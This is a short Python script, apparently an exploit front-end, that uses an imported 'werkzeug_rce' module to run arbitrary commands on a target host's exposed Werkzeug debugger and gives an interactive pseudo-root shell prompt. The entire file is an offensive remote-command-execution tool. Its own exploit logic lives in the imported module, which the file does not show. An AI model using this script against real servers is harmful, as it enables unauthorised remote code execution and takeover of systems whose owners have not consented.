#!/usr/bin/env python
from sys import argv
from werkzeug_rce import DebugRce

if __name__=='__main__':
	d = DebugRce(argv[1])
	d.exec(argv[2])

	while True:
		try:
			cmd = input(f'root@{argv[1]}:~$ ')
			for line in d.exec(cmd):
				print(line)
		except:
			print('\nQuiting!')
			exit()
